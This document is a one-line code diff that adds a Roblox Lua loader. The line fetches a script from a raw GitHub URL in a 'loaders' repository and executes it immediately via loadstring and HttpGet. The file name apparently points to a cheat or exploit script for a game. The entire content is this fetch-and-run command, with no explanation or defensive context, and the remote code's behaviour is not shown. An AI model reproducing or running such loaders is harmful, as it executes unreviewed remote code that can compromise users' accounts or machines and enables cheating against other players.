@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/slayers-2-spam0-vagsb1psgrsolc.lua"))()
